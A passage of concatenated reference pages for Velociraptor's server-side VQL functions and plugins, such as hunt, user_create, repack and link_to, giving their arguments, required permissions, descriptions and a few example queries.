|[hunt_info](hunt_info)|<span class='vql_type'>Function</span>|Retrieve the hunt information|
|[hunt_results](hunt_results)|<span class='vql_type'>Plugin</span>|Retrieve the results of a hunt|
|[hunt_update](hunt_update)|<span class='vql_type'>Function</span>|Update a hunt|
|[hunts](hunts)|<span class='vql_type'>Plugin</span>|Retrieve the list of hunts|
|[import](import)|<span class='vql_type'>Function</span>|Imports an artifact into the current scope|
|[import_collection](import_collection)|<span class='vql_type'>Function</span>|Imports an offline collection zip file (experimental)|
|[inventory](inventory)|<span class='vql_type'>Plugin</span>|Retrieve the tools inventory|
|[inventory_add](inventory_add)|<span class='vql_type'>Function</span>|Add or reconfigure a tool into the inventory|
|[inventory_get](inventory_get)|<span class='vql_type'>Function</span>|Get tool info from inventory service|
|[killkillkill](killkillkill)|<span class='vql_type'>Function</span>|Sends a kill message to the client and forces a restart - this is very aggressive!|
|[label](label)|<span class='vql_type'>Function</span>|Add the labels to the client|
|[link_to](link_to)|<span class='vql_type'>Function</span>|Create a url linking to a particular part in the Velociraptor GUI|
|[logging](logging)|<span class='vql_type'>Plugin</span>|Watch the logs emitted by the server|
|[mail](mail)|<span class='vql_type'>Plugin</span>|Send Email to a remote server|
|[monitoring](monitoring)|<span class='vql_type'>Plugin</span>|Extract monitoring log from a client|
|[monitoring_logs](monitoring_logs)|<span class='vql_type'>Plugin</span>|Retrieve log messages from client event monitoring for the specified client id and artifact|
|[notebook_create](notebook_create)|<span class='vql_type'>Function</span>|Create a new notebook|
|[notebook_delete](notebook_delete)|<span class='vql_type'>Plugin</span>|Delete a notebook with all its cells|
|[notebook_export](notebook_export)|<span class='vql_type'>Function</span>|Exports a notebook to a zip file or HTML|
|[notebook_get](notebook_get)|<span class='vql_type'>Function</span>|Get a notebook|
|[notebook_update](notebook_update)|<span class='vql_type'>Function</span>|Update a notebook metadata|
|[notebook_update_cell](notebook_update_cell)|<span class='vql_type'>Function</span>|Update a notebook cell|
|[org](org)|<span class='vql_type'>Function</span>|Return the details of the current org|
|[org_create](org_create)|<span class='vql_type'>Function</span>|Creates a new organization|
|[org_delete](org_delete)|<span class='vql_type'>Function</span>|Deletes an Org from the server|
|[orgs](orgs)|<span class='vql_type'>Plugin</span>|Retrieve the list of orgs on this server|
|[parallelize](parallelize)|<span class='vql_type'>Plugin</span>|Runs query on result batches in parallel|
|[passwd](passwd)|<span class='vql_type'>Function</span>|Updates the user's password|
|[query](query)|<span class='vql_type'>Plugin</span>|Evaluate a VQL query|
|[repack](repack)|<span class='vql_type'>Function</span>|Repack and upload a repacked binary or MSI to the server|
|[rm_client_monitoring](rm_client_monitoring)|<span class='vql_type'>Function</span>|Remove an artifact from the client monitoring table|
|[rm_server_monitoring](rm_server_monitoring)|<span class='vql_type'>Function</span>|Remove an artifact from the server monitoring table|
|[send_event](send_event)|<span class='vql_type'>Function</span>|Sends an event to a server event monitoring queue|
|[server_frontend_cert](server_frontend_cert)|<span class='vql_type'>Function</span>|Get Server Frontend Certificate|
|[server_metadata](server_metadata)|<span class='vql_type'>Function</span>|Returns server metadata from the datastore|
|[server_set_metadata](server_set_metadata)|<span class='vql_type'>Function</span>|Sets server metadata|
|[set_client_monitoring](set_client_monitoring)|<span class='vql_type'>Function</span>|Sets the current client monitoring state|
|[set_server_monitoring](set_server_monitoring)|<span class='vql_type'>Function</span>|Sets the current server monitoring state|
|[source](source)|<span class='vql_type'>Plugin</span>|Retrieve rows from an artifact's source|
|[timeline](timeline)|<span class='vql_type'>Plugin</span>|Read a timeline|
|[timeline_add](timeline_add)|<span class='vql_type'>Function</span>|Add a new query to a timeline|
|[timeline_delete](timeline_delete)|<span class='vql_type'>Function</span>|Delete a super timeline|
|[timelines](timelines)|<span class='vql_type'>Plugin</span>|List all timelines in a notebook|
|[upload_directory](upload_directory)|<span class='vql_type'>Function</span>|Upload a file to an upload directory|
|[uploads](uploads)|<span class='vql_type'>Plugin</span>|Retrieve information about a flow's uploads|
|[user](user)|<span class='vql_type'>Function</span>|Retrieves information about the Velociraptor user|
|[user_create](user_create)|<span class='vql_type'>Function</span>|Creates a new user from the server, or updates their permissions or reset their password|
|[user_delete](user_delete)|<span class='vql_type'>Function</span>|Deletes a user from the server|
|[user_grant](user_grant)|<span class='vql_type'>Function</span>|Grants the user the specified roles|
|[user_options](user_options)|<span class='vql_type'>Function</span>|Update and read the user GUI options|
|[vfs_ls](vfs_ls)|<span class='vql_type'>Plugin</span>|List directory and build a VFS object|
|[whoami](whoami)|<span class='vql_type'>Function</span>|Returns the username that is running the query|

---END OF FILE---

======
FILE: /content/vql_reference/server/set_server_monitoring/_index.md
======
---
title: set_server_monitoring
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## set_server_monitoring
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
value|The Value to set|Any (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">COLLECT_SERVER</span>

### Description

Sets the current server monitoring state.


---END OF FILE---

======
FILE: /content/vql_reference/server/logging/_index.md
======
---
title: logging
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## logging
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
component||string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Watch the logs emitted by the server.


---END OF FILE---

======
FILE: /content/vql_reference/server/hunt_results/_index.md
======
---
title: hunt_results
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## hunt_results
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
artifact|The artifact to retrieve|string
source|An optional source within the artifact.|string
hunt_id|The hunt id to read.|string (required)
brief|If set we return less columns (deprecated).|bool
orgs|If set we combine results from all orgs.|list of string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Retrieve the results of a hunt.

This plugin essentially iterates over all flows in the hunt and
reads out all collected rows for each client in the same table.

It is equivalent to the source() plugin in the hunt notebook
context.



---END OF FILE---

======
FILE: /content/vql_reference/server/delete_flow/_index.md
======
---
title: delete_flow
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## delete_flow
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
flow_id||string (required)
client_id||string (required)
really_do_it||bool
sync|If specified we ensure data is available immediately|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">DELETE_RESULTS</span>

### Description

Delete all the files that make up a flow.


---END OF FILE---

======
FILE: /content/vql_reference/server/client_create/_index.md
======
---
title: client_create
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## client_create
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
first_seen_at||time.Time
last_seen_at||time.Time
labels||list of string
os|What type of OS this is (default offline)|string
hostname|The hostname of the system|string
client_id|if set we use this client id otherwise we make a new one|string
mac_addresses||list of string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">SERVER_ADMIN</span>

### Description

Create a new client in the data store.


---END OF FILE---

======
FILE: /content/vql_reference/server/timeline_delete/_index.md
======
---
title: timeline_delete
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## timeline_delete
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
timeline|Supertimeline to delete.|string (required)
notebook_id|The notebook ID the timeline is stored in.|string
name|Name/Id of child timeline to delete. If not specified deletes the entire timeline|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">NOTEBOOK_EDITOR</span>

### Description

Delete a super timeline.


---END OF FILE---

======
FILE: /content/vql_reference/server/notebook_export/_index.md
======
---
title: notebook_export
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## notebook_export
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
notebook_id|The id of the notebook to export|string (required)
filename|The name of the export. If not set this will be named according to the notebook id and timestamp|string
type|Set the type of the export (html or zip).|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">PREPARE_RESULTS</span>

### Description

Exports a notebook to a zip file or HTML.


---END OF FILE---

======
FILE: /content/vql_reference/server/user_create/_index.md
======
---
title: user_create
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## user_create
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
user|The user to create or update.|string (required)
roles|List of roles to give the user.|list of string (required)
password|A password to set for the user (If not using SSO this might be needed).|string
orgs|One or more org IDs to grant access to. If empty we use the current org.|list of string

### Description

Creates a new user from the server, or updates their permissions or reset their password.


---END OF FILE---

======
FILE: /content/vql_reference/server/enumerate_flow/_index.md
======
---
title: enumerate_flow
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## enumerate_flow
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
client_id||string (required)
flow_id||string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Enumerate all the files that make up a flow.

This includes the uploaded files, the result sets and the various
metadata files that result flow state information.

This plugin is mostly used for archiving or deleting a flow from
the filestore.



---END OF FILE---

======
FILE: /content/vql_reference/server/flow_results/_index.md
======
---
title: flow_results
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## flow_results
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
artifact|The artifact to retrieve|string
source|An optional source within the artifact.|string
flow_id|The hunt id to read.|string (required)
client_id|The client id to extract|string (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Retrieve the results of a flow.

This is similar to the source() plugin.

### Notes

Since a collection can collect multiple artifacts you must
specify the artifact you are interested in.



---END OF FILE---

======
FILE: /content/vql_reference/server/gui_users/_index.md
======
---
title: gui_users
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## gui_users
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
all_orgs|If set we enumerate permission for all orgs, otherwise just for this org.|bool

### Description

Retrieve the list of users on the server.



---END OF FILE---

======
FILE: /content/vql_reference/server/hunt_update/_index.md
======
---
title: hunt_update
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## hunt_update
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
hunt_id|The hunt to update|string (required)
stop|Stop the hunt|bool
start|Start the hunt|bool
description|Update hunt description|string
expires|Update hunt expiry|time.Time
add_labels|Labels to be added to hunt|list of string
del_labels|Labels to be removed from hunt|list of string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">START_HUNT</span>

### Description

Update a hunt.


---END OF FILE---

======
FILE: /content/vql_reference/server/get_flow/_index.md
======
---
title: get_flow
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## get_flow
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
client_id||string (required)
flow_id||string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">COLLECT_CLIENT</span>
<span class="permission_list linkcolour label label-important">COLLECT_SERVER</span>

### Description

Gets flow details.


---END OF FILE---

======
FILE: /content/vql_reference/server/inventory/_index.md
======
---
title: inventory
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## inventory
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>


### Description

Retrieve the tools inventory.

The inventory contains information about all the external tools
Velociraptor is managing. This plugin will display this.

See https://docs.velociraptor.app/docs/extending_vql/#using-external-tools



---END OF FILE---

======
FILE: /content/vql_reference/server/rm_server_monitoring/_index.md
======
---
title: rm_server_monitoring
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## rm_server_monitoring
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
artifact|The name of the artifact to remove|string (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">COLLECT_SERVER</span>

### Description

Remove an artifact from the server monitoring table.


---END OF FILE---

======
FILE: /content/vql_reference/server/repack/_index.md
======
---
title: repack
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## repack
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
target|The name of the target OS to repack (VelociraptorWindows, VelociraptorLinux, VelociraptorDarwin)|string
version|Velociraptor Version to repack|string
exe|Alternative a path to the executable to repack|OSPath
accessor|The accessor to use to read the file.|string
binaries|List of tool names that will be repacked into the target|list of string
config|The config to be repacked in the form of a json or yaml string|string (required)
upload_name|The name of the upload to create|string (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">COLLECT_SERVER</span>

### Description

Repack and upload a repacked binary or MSI to the server.


---END OF FILE---

======
FILE: /content/vql_reference/server/source/_index.md
======
---
title: source
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## source
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
client_id|The client id to extract|string
flow_id|A flow ID (client or server artifacts)|string
hunt_id|Retrieve sources from this hunt (combines all results from all clients)|string
artifact|The name of the artifact collection to fetch|string
source|An optional named source within the artifact|string
start_time|Start return events from this date (for event sources)|Any
end_time|Stop end events reach this time (event sources).|Any
notebook_id|The notebook to read from (should also include cell id)|string
notebook_cell_id|The notebook cell read from (should also include notebook id)|string
notebook_cell_version|The notebook cell version to read from (should also include notebook id and notebook cell)|string
notebook_cell_table|A notebook cell can have multiple tables.)|int64
start_row|Start reading the result set from this row|int64
count|Maximum number of rows to fetch (default unlimited)|int64
orgs|Run the query over these orgs. If empty use the current org.|list of string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Retrieve rows from an artifact's source.

This plugin is mostly useful in reports. It attempts to do the
right thing automatically by inferring most parameters from its
execution environment.

For example when called within a CLIENT report context, it will
automatically fill its flow id, client id etc. Typically this
means that you only need to specify the source name (for
multi-source artifacts).



---END OF FILE---

======
FILE: /content/vql_reference/server/delete_events/_index.md
======
---
title: delete_events
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## delete_events
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
artifact|Name of artifact events to remove|string (required)
client_id|Client ID of events to remove (use 'server' for server events)|string (required)
start_time|Start time to be deleted|time.Time
end_time|End time to be deleted|time.Time
really_do_it|If not specified, just show what files will be removed|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">DELETE_RESULTS</span>

### Description

Delete events from a flow.


---END OF FILE---

======
FILE: /content/vql_reference/server/flows/_index.md
======
---
title: flows
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## flows
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
client_id||string (required)
flow_id||string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Retrieve the flows launched on each client.

Each flow record will include the creator of the flow, the request
and metadata about the collection.



---END OF FILE---

======
FILE: /content/vql_reference/server/timeline/_index.md
======
---
title: timeline
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## timeline
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
timeline|Name of the timeline to read|string (required)
components|List of child components to include|list of string
skip|List of child components to skip|list of string
start|First timestamp to fetch|Any
notebook_id|The notebook ID the timeline is stored in.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Read a timeline. You can create a timeline with the timeline_add() function


---END OF FILE---

======
FILE: /content/vql_reference/server/notebook_delete/_index.md
======
---
title: notebook_delete
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## notebook_delete
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
notebook_id||string (required)
really_do_it||bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">SERVER_ADMIN</span>

### Description

Delete a notebook with all its cells. 


---END OF FILE---

======
FILE: /content/vql_reference/server/send_event/_index.md
======
---
title: send_event
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## send_event
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
artifact|The artifact name to send the event to.|string (required)
row|The row to send to the artifact|ordereddict.Dict (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">SERVER_ADMIN</span>
<span class="permission_list linkcolour label label-important">PUBLISH</span>

### Description

Sends an event to a server event monitoring queue.

This is used to send an event to a waiting server event monitoring
artifact (either as a VQL query running on the server or perhaps
an external program waiting for this event via the API.



---END OF FILE---

======
FILE: /content/vql_reference/server/import_collection/_index.md
======
---
title: import_collection
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## import_collection
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
client_id|The client id to import to. Use 'auto' to generate a new client id or use the host info from the collection.|string
hostname|When creating a new client, set this as the hostname.|string
filename|Path on server to the collector zip.|string (required)
accessor|The accessor to use.|string
import_type|Whether the import is an offline_collector or hunt.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">COLLECT_SERVER</span>
<span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Imports an offline collection zip file (experimental).

Offline collectors are preconfigure Velociraptor binaries that
collect specific artifacts into a zip file.

This function allows such a collection to be imported into the GUI
as if it was collected by the server. The collection will be
loaded into a client's filestore directory.

Since there is no actual client id associated with the offline
collection (there is no Velociraptor client running on the
endpoint) we generate a random client ID for a new client.

If you specify an existing client id, the collection will be
uploaded into that client.

### Notes

Combine this function with the hunt_add() function to add a
manual offline collection to an ongoing hunt.



---END OF FILE---

======
FILE: /content/vql_reference/server/add_server_monitoring/_index.md
======
---
title: add_server_monitoring
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## add_server_monitoring
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
artifact|The name of the artifact to add|string (required)
parameters|A dict of artifact parameters|LazyExpr

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">COLLECT_SERVER</span>

### Description

Adds a new artifact to the server monitoring table.


---END OF FILE---

======
FILE: /content/vql_reference/server/artifact_set/_index.md
======
---
title: artifact_set
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## artifact_set
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
definition|Artifact definition in YAML|string
prefix|Required name prefix|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">ARTIFACT_WRITER</span>
<span class="permission_list linkcolour label label-important">SERVER_ARTIFACT_WRITER</span>

### Description

Sets an artifact into the global repository.


---END OF FILE---

======
FILE: /content/vql_reference/server/timelines/_index.md
======
---
title: timelines
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## timelines
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
notebook_id|The notebook ID the timeline is stored in.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

List all timelines in a notebook


---END OF FILE---

======
FILE: /content/vql_reference/server/link_to/_index.md
======
---
title: link_to
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## link_to
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
type|The type of link. Currently one of collection, hunt, artifact, event, debug|string
client_id||string
flow_id||string
upload|Upload object for the file to upload (upload object is returned by the upload() function)|ordereddict.Dict
tab|The tab to focus - can be overview, request, results, logs, notebook|string
text|If specified we emit a markdown style URL with a text|string
hunt_id|The hunt id to read.|string
artifact|The artifact to retrieve|string
raw|When specified we emit a raw URL (without autodetected text)|bool
org|If set the link accesses a different org. Otherwise we accesses the current org.|string

### Description

Create a url linking to a particular part in the Velociraptor GUI.

This function knows about how Velociraptor web app is routed
internally and can help you generate a valid URL that links into
the app. You can then use this URL to share a reference via
e.g. email, slack or other means.

The links generated will be in markdown format by default (i.e. of
the for `[Text](url)`). If you need a raw link without the text,
specify the `raw` parameter as TRUE.

If a link text is not supplied, this function will create a
default text message:

* For client links this text will also include the hostname
* For artifact links, this will include the artifact name
* For hunt, flows etc the text will be the hunt id, flow id etc.

By default the link will refer to the current org but you can
override this with the org id.

If you want to display the links in the notebook within the GUI
table you will need to set the column type to `url_internal` or
`url`.

### Example

```vql
// Setting this in a notebook will tell the GUI to treat this
// column as URL.
LET ColumnTypes <= dict(HuntLink="url_internal")

SELECT link_to(hunt_id="H.1234") AS HuntLink,
       link_to(client_id="C.123", flow_id="F.123") AS FlowLink,
       link_to(client_id="C.123") AS ClientLink,
       link_to(client_id="C.123", artifact="Custom.Artifact.Name",
               text='Event link') AS ArtifactLink,
       link_to(artifact="Custom.Artifact.Name"),
       link_to(upload=Upload) AS Download
FROM scope()
```

### Notes

This function makes no effort to check if the link is
actually valid - i.e. it does not check that the client id refers
to a real client, flow id to a real flow, etc.



---END OF FILE---

======
FILE: /content/vql_reference/server/get_server_monitoring/_index.md
======
---
title: get_server_monitoring
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## get_server_monitoring
<span class='vql_type label label-warning pull-right page-header'>Function</span>


<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Retrieve the current server monitoring state.

See `get_client_monitoring()`



---END OF FILE---

======
FILE: /content/vql_reference/server/notebook_update/_index.md
======
---
title: notebook_update
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## notebook_update
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
notebook_id|The id of the notebook to update|string (required)
description|The description of the notebook|string
collaborators|A list of users to share the notebook with.|list of string
public|If set the notebook will be public.|bool
attachment|Raw data of an attachment to be added to the notebook|string
attachment_filename|The name of the attachment|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">COLLECT_SERVER</span>

### Description

Update a notebook metadata.


---END OF FILE---

======
FILE: /content/vql_reference/server/artifact_definitions/_index.md
======
---
title: artifact_definitions
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## artifact_definitions
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
names|Artifact definitions to dump|list of string
deps|If true includes all dependencies as well.|bool
sanitize|If true we remove extra metadata.|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Dump artifact definitions from the internal repository.


---END OF FILE---

======
FILE: /content/vql_reference/server/client_delete/_index.md
======
---
title: client_delete
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## client_delete
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
client_id||string (required)
really_do_it||bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">DELETE_RESULTS</span>

### Description

Delete all information related to a client from the filestore.



---END OF FILE---

======
FILE: /content/vql_reference/server/user_grant/_index.md
======
---
title: user_grant
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## user_grant
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
user|The user to create or update.|string (required)
roles|List of roles to give the user.|list of string
orgs|One or more org IDs to grant access to. If not specified we use current org|list of string
policy|A dict of permissions to set (e.g. as obtained from the gui_users() function).|ordereddict.Dict

### Description

Grants the user the specified roles.


---END OF FILE---

======
FILE: /content/vql_reference/server/whoami/_index.md
======
---
title: whoami
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## whoami
<span class='vql_type label label-warning pull-right page-header'>Function</span>


### Description

Returns the username that is running the query.


---END OF FILE---

======
FILE: /content/vql_reference/server/cancel_flow/_index.md
======
---
title: cancel_flow
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## cancel_flow
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
client_id||string (required)
flow_id||string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">COLLECT_SERVER</span>
<span class="permission_list linkcolour label label-important">COLLECT_CLIENT</span>

### Description

Cancels the flow.

This sends the client an immediate cancellation message and stops
the flow. It also removes any outstanding requests for the client
if there are any.



---END OF FILE---

======
FILE: /content/vql_reference/server/passwd/_index.md
======
---
title: passwd
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## passwd
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
user|The user to set password for. If not set, changes the current user's password.|string
password|The new password to set.|string (required)

### Description

Updates the user's password.


---END OF FILE---

======
FILE: /content/vql_reference/server/label/_index.md
======
---
title: label
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## label
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
client_id|Client ID to label.|string (required)
labels|A list of labels to apply|list of string (required)
op|An operation on the labels (set, check, remove)|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">LABEL_CLIENT</span>

### Description

Add the labels to the client. If op is 'remove' then remove these labels.

### Example

The following query sets the MyLabel label on all hosts that last
connected from an IP address matching the regular expression (You
can also do a CIDR check using the `cidr_contains()` function)

```vql
SELECT *, label(labels='MyLabel', op='set', client_id=client_id)
FROM clients() WHERE  last_ip =~ "127.+"
```



---END OF FILE---

======
FILE: /content/vql_reference/server/hunt_info/_index.md
======
---
title: hunt_info
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## hunt_info
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
hunt_id|Hunt Id to look up or a flow id created by that hunt (e.g. F.CRUU3KIE5D73G.H ).|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Retrieve the hunt information.

This function is a convenience function to the full hunts()
plugin, and can retrieve the hunt information for a specific hunt
id. As a convenience, the function will also accept a flow id for
flows which were launched by the hunt. These flow IDs have a
specific format indicating they were launched from a hunt.



---END OF FILE---

======
FILE: /content/vql_reference/server/hunt/_index.md
======
---
title: hunt
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## hunt
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
description|Description of the hunt|string
artifacts|A list of artifacts to collect|list of string (required)
expires|A time for expiry (e.g. now() + 1800)|LazyExpr
spec|Parameters to apply to the artifacts|Any
timeout|Set query timeout (default 10 min)|uint64
ops_per_sec|Set query ops_per_sec value|float64
cpu_limit|Set query ops_per_sec value|float64
iops_limit|Set query ops_per_sec value|float64
max_rows|Max number of rows to fetch|uint64
max_bytes|Max number of bytes to upload|uint64
pause|If specified the new hunt will be in the paused state|bool
include_labels|If specified only include these labels|list of string
exclude_labels|If specified exclude these labels|list of string
os|If specified target this OS|string
org_id|If set the collection will be started in the specified orgs.|list of string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">START_HUNT</span>
<span class="permission_list linkcolour label label-important">ORG_ADMIN</span>

### Description

Create and launch a hunt.

This function will create a new hunt to collect the specified
artifacts. The artifacts to collect are provided in the
`artifacts` parameter. Artifact parameters are provided in the
`spec` parameter (see example below).

### Notes

No caching is currently provided so this may generate a lot
of load on DNS servers when scanning many rows.

1. In the GUI hunts are always created in the paused
state. This is not the default state when using this function (all
hunts are immediately active - if you want the hunt to be created
in the paused state provide the `pause=TRUE` parameter).

2. The expiry time is specified in any of the usual time
specification ways (seconds since epoch, or ISO format like
"2021-10-02"). If the expiry time is in the past, the hunt will
not be created.

```vql
SELECT hunt(
    description="A general hunt",
    artifacts='Windows.KapeFiles.Targets',
    spec=dict(`Windows.KapeFiles.Targets`=dict(
        Device ='C:', VSSAnalysis='Y', KapeTriage='Y')),
    expires=now() + 18000)
FROM scope()
```



---END OF FILE---

======
FILE: /content/vql_reference/server/client_set_metadata/_index.md
======
---
